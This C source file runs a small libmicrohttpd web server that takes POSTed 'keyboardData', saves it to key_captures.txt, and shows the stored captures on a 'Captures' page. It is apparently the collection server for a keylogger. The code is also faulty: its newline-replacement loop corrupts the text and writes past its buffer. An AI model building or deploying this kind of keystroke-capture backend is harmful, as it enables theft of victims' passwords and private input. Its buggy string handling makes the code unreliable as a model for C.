#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <microhttpd.h>

#define PORT 8080

static int send_response(struct MHD_Connection *connection, const char *page) {
    struct MHD_Response *response;
    int ret;

    response = MHD_create_response_from_buffer(strlen(page), (void *)page, MHD_RESPMEM_PERSISTENT);
    if (!response)
        return MHD_NO;

    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
    MHD_destroy_response(response);

    return ret;
}

static int request_handler(void *cls, struct MHD_Connection *connection, const char *url,
                           const char *method, const char *version, const char *upload_data,
                           size_t *upload_data_size, void **con_cls) {
    const char *page;

    if (strcmp(method, "GET") == 0) {
        FILE *file = fopen("./key_captures.txt", "r");
        if (file) {
            fseek(file, 0, SEEK_END);
            long file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            char *file_content = malloc(file_size + 1);
            fread(file_content, 1, file_size, file);
            file_content[file_size] = '\0';
            fclose(file);

            // Replace newlines with <br>
            for (char *p = file_content; *p; p++) {
                if (*p == '\n') *p = '<'; // Change '\n' to '<br>'
                else if (*p == '<') memmove(p + 3, p + 1, strlen(p + 1) + 1), memcpy(p, "<br>", 4), p += 3;
            }

            char *response = malloc(strlen(file_content) + 100);
            sprintf(response, "<h1 style=\"color: #3366cc;\">Captures</h1><p style=\"color: #009900;\">%s</p>", file_content);
            free(file_content);
            page = response;
        } else {
            page = "<h1 style='color: #cc0000;'>Still Capturing......</h1>";
        }
    } else if (strcmp(method, "POST") == 0) {
        const char *keyboard_data = MHD_lookup_connection_value(connection, MHD_POSTDATA_KIND, "keyboardData");
        if (keyboard_data) {
            FILE *file = fopen("key_captures.txt", "w");
            if (file) {
                fwrite(keyboard_data, sizeof(char), strlen(keyboard_data), file);
                fclose(file);
            }
            page = "Successfully set the data";
        } else {
            page = "No data received";
        }
    } else {
        return MHD_NO;
    }

    return send_response(connection, page);
}

int main() {
    struct MHD_Daemon *daemon;

    daemon = MHD_start_daemon(MHD_USE_INTERNAL_POLLING_THREAD, PORT, NULL, NULL,
                              &request_handler, NULL, MHD_OPTION_END);
    if (NULL == daemon) return 1;

    printf("[+] Server is listening on port %d...\n", PORT);
    getchar(); // Wait for user input to stop the server
    MHD_stop_daemon(daemon);

    return 0;
}
